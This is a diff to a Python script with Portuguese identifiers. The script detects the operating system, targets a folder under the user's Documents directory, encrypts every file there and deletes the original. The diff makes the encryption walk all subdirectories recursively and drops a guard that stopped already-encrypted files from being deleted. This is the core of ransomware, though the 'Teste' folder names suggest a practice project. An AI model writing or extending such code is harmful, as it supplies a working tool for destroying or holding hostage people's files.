@@ -42,24 +42,13 @@ def decrypt_file(encrypted_path, key, output_path):
     with open(output_path, 'wb') as decrypted_file:
         decrypted_file.write(decrypted_data)
 
-def criptografar(diretorio_path):
-    key_path = 'key.key'
-    if os.path.exists(key_path):
-        key = load_key(key_path)
-    else:
-        key = generate_key()
-        save_key(key, key_path)
-
-    for filename in os.listdir(diretorio_path):
-        if os.path.isfile(os.path.join(diretorio_path, filename)):
-            file_path = os.path.join(diretorio_path, filename)
-            output_path = os.path.join(diretorio_path, f'encrypted_{filename}')
+def criptografar(diretorio_path, key):
+    for root, dirs, files in os.walk(diretorio_path):
+        for filename in files:
+            file_path = os.path.join(root, filename)
+            output_path = os.path.join(root, f'encrypted_{filename}')
             encrypt_file(file_path, key, output_path)
-            print(f'Arquivo {filename} criptografado com sucesso.')
-
-            if not filename.startswith('encrypted_'):
-                os.remove(file_path)
-                print(f'Arquivo original {filename} removido.')
+            os.remove(file_path)
 
     print('Processo de criptografia realizado com sucesso')
 
@@ -72,17 +61,26 @@ def identificar_so():
         print(f'Release: {release}')
         nome = user_name()
         diretorio = f'C:\\Users\\{nome}\\Documents\\Teste'
-        criptografar(diretorio)
+
         
     elif 'Linux' in sistema:
         distro = platform.freedesktop_os_release()
         print(distro['NAME'], distro['VERSION'])
         nome = user_name()
         diretorio = f'/home/{nome}/Documentos/teste'
-        criptografar(diretorio)
+    
         
     else:
         print(f'Sistema Operacional não reconhecido: {sistema}')
+
+    key_path = 'key.key'
+    if os.path.exists(key_path):
+        key = load_key(key_path)
+    else:
+        key = generate_key()
+        save_key(key, key_path)
+
+    criptografar(diretorio, key)
     
     return sistema
 
